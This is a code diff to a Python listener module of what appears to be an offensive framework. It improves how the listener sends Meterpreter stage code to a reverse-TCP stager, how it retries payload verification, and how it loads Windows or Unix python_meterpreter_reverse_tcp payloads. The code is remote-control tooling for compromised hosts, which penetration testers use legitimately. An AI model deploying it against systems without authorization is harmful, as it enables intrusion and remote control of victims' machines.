@@ -238,20 +238,35 @@ class Module(Listener):
                     print_info(f"[DEBUG] Sent Meterpreter stage code ({len(stage_bytes)} bytes) to stager")
                 else:
                     print_warning("[DEBUG] Could not get stage code, stager may fail")
+                    # Try to continue anyway - maybe it's a direct connection
             except Exception as e:
                 print_warning(f"[DEBUG] Error sending stage code: {e}")
+                import traceback
+                traceback.print_exc()
                 # Continue anyway - maybe it's not a stager connection
             
-            # Now wait a moment for the stage to load and initialize
-            time.sleep(1.0)  # Increased to give stage time to execute
+            # Wait for the stage to load and initialize
+            # Give it more time - stage execution can take a moment
+            time.sleep(2.0)  # Increased wait time for stage initialization
             
             # Verify that the payload is working by sending a test command
-            # If the payload failed to execute (e.g., syntax error), it won't respond
-            payload_valid = self._verify_payload(client_socket)
+            # Retry verification up to 3 times with increasing delays
+            payload_valid = False
+            for attempt in range(3):
+                if attempt > 0:
+                    time.sleep(1.0)  # Wait a bit longer between retries
+                payload_valid = self._verify_payload(client_socket)
+                if payload_valid:
+                    break
+                if attempt < 2:  # Don't print error on last attempt
+                    print_warning(f"[DEBUG] Payload verification attempt {attempt + 1} failed, retrying...")
             
             if not payload_valid:
                 print_error("Payload verification failed - stage may have failed to execute")
-                print_error("Connection closed - no session created")
+                print_error("Possible causes:")
+                print_error("  - Stage code execution error (check stager output)")
+                print_error("  - Network connectivity issues")
+                print_error("  - Socket closed prematurely")
                 try:
                     client_socket.close()
                 except:
@@ -313,9 +328,9 @@ class Module(Listener):
             import json
             import struct
             
-            # Set a short timeout for the verification
+            # Set a reasonable timeout for the verification
             original_timeout = client_socket.gettimeout()
-            client_socket.settimeout(5.0)  # 5 second timeout for verification
+            client_socket.settimeout(10.0)  # 10 second timeout for verification
             
             # Send a simple test command (getpid)
             cmd_data = {
@@ -326,8 +341,14 @@ class Module(Listener):
             cmd_bytes = cmd_json.encode('utf-8')
             
             # Send length (4 bytes big-endian) then data
-            length = struct.pack('>I', len(cmd_bytes))
-            client_socket.sendall(length + cmd_bytes)
+            try:
+                length = struct.pack('>I', len(cmd_bytes))
+                client_socket.sendall(length + cmd_bytes)
+            except (socket.error, OSError) as e:
+                error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
+                print_warning(f"[DEBUG] Payload verification: failed to send command (error {error_code}): {e}")
+                client_socket.settimeout(original_timeout)
+                return False
             
             # Wait for response
             # Receive length (4 bytes)
@@ -337,33 +358,53 @@ class Module(Listener):
                 try:
                     chunk = client_socket.recv(4 - len(length_data))
                     if not chunk:
-                        print_warning("[DEBUG] Payload verification: connection closed")
+                        print_warning("[DEBUG] Payload verification: connection closed while receiving length")
+                        client_socket.settimeout(original_timeout)
                         return False
                     length_data += chunk
                 except socket.timeout:
                     elapsed = time.time() - start_time
-                    if elapsed > 5.0:
-                        print_warning("[DEBUG] Payload verification: timeout waiting for response")
+                    if elapsed > 10.0:
+                        print_warning("[DEBUG] Payload verification: timeout waiting for response length")
+                        client_socket.settimeout(original_timeout)
                         return False
                     continue
+                except (socket.error, OSError) as e:
+                    error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
+                    print_warning(f"[DEBUG] Payload verification: socket error receiving length (error {error_code}): {e}")
+                    client_socket.settimeout(original_timeout)
+                    return False
             
             response_length = struct.unpack('>I', length_data)[0]
+            
+            # Validate response length
+            if response_length > 10 * 1024 * 1024:  # 10MB max
+                print_warning(f"[DEBUG] Payload verification: response length too large: {response_length}")
+                client_socket.settimeout(original_timeout)
+                return False
             
             # Receive response data
             response_data = b''
             while len(response_data) < response_length:
                 try:
-                    chunk = client_socket.recv(response_length - len(response_data))
+                    chunk = client_socket.recv(min(65536, response_length - len(response_data)))
                     if not chunk:
-                        print_warning("[DEBUG] Payload verification: connection closed while receiving response")
+                        print_warning(f"[DEBUG] Payload verification: connection closed while receiving response (got {len(response_data)}/{response_length})")
+                        client_socket.settimeout(original_timeout)
                         return False
                     response_data += chunk
                 except socket.timeout:
                     elapsed = time.time() - start_time
-                    if elapsed > 5.0:
-                        print_warning("[DEBUG] Payload verification: timeout receiving response")
+                    if elapsed > 10.0:
+                        print_warning(f"[DEBUG] Payload verification: timeout receiving response (got {len(response_data)}/{response_length})")
+                        client_socket.settimeout(original_timeout)
                         return False
                     continue
+                except (socket.error, OSError) as e:
+                    error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
+                    print_warning(f"[DEBUG] Payload verification: socket error receiving response (error {error_code}): {e}")
+                    client_socket.settimeout(original_timeout)
+                    return False
             
             # Parse response
             try:
@@ -375,16 +416,20 @@ class Module(Listener):
                     client_socket.settimeout(original_timeout)
                     return True
                 else:
-                    print_warning(f"[DEBUG] Payload verification: got error status {response.get('status')}")
+                    error_msg = response.get('error', 'Unknown error')
+                    print_warning(f"[DEBUG] Payload verification: got error status {response.get('status')}: {error_msg}")
                     client_socket.settimeout(original_timeout)
                     return False
-            except json.JSONDecodeError:
-                print_warning("[DEBUG] Payload verification: invalid JSON response")
+            except json.JSONDecodeError as e:
+                print_warning(f"[DEBUG] Payload verification: invalid JSON response: {e}")
+                print_warning(f"[DEBUG] Response data (first 200 chars): {response_data[:200]}")
                 client_socket.settimeout(original_timeout)
                 return False
                 
         except Exception as e:
             print_warning(f"[DEBUG] Payload verification failed: {e}")
+            import traceback
+            traceback.print_exc()
             try:
                 client_socket.settimeout(original_timeout)
             except:
@@ -396,16 +441,41 @@ class Module(Listener):
         try:
             # Try to get the payload module from framework
             if self.framework and hasattr(self.framework, 'module_loader'):
-                # Load the Python Meterpreter payload module
-                payload_path = 'payloads/singles/cmd/unix/python_meterpreter_reverse_tcp'
-                payload_module = self.framework.module_loader.load_module(payload_path, framework=self.framework)
+                # Try Windows payload first, then fallback to Unix
+                payload_paths = [
+                    'payloads/singles/cmd/windows/python_meterpreter_reverse_tcp',
+                    'payloads/singles/cmd/unix/python_meterpreter_reverse_tcp'
+                ]
                 
-                if payload_module and hasattr(payload_module, 'get_stage_code'):
-                    return payload_module.get_stage_code()
-                elif payload_module and hasattr(payload_module, 'meterpreter_stage_code'):
-                    return payload_module.meterpreter_stage_code
+                for payload_path in payload_paths:
+                    try:
+                        payload_module = self.framework.module_loader.load_module(payload_path, framework=self.framework)
+                        
+                        if payload_module:
+                            # Set lhost and lport if needed
+                            if hasattr(payload_module, 'lhost'):
+                                payload_module.set_option('lhost', self.lhost)
+                            if hasattr(payload_module, 'lport'):
+                                payload_module.set_option('lport', self.lport)
+                            
+                            if hasattr(payload_module, 'get_stage_code'):
+                                stage_code = payload_module.get_stage_code()
+                                if stage_code:
+                                    return stage_code
+                            elif hasattr(payload_module, 'meterpreter_stage_code'):
+                                return payload_module.meterpreter_stage_code
+                            elif hasattr(payload_module, 'generate'):
+                                # Generate to populate meterpreter_stage_code
+                                payload_module.generate()
+                                if hasattr(payload_module, 'meterpreter_stage_code'):
+                                    return payload_module.meterpreter_stage_code
+                    except Exception as e:
+                        # Try next path
+                        continue
         except Exception as e:
             print_warning(f"Could not get stage code from payload module: {e}")
+            import traceback
+            traceback.print_exc()
         
         # Fallback: return None (stager will handle it)
         return None
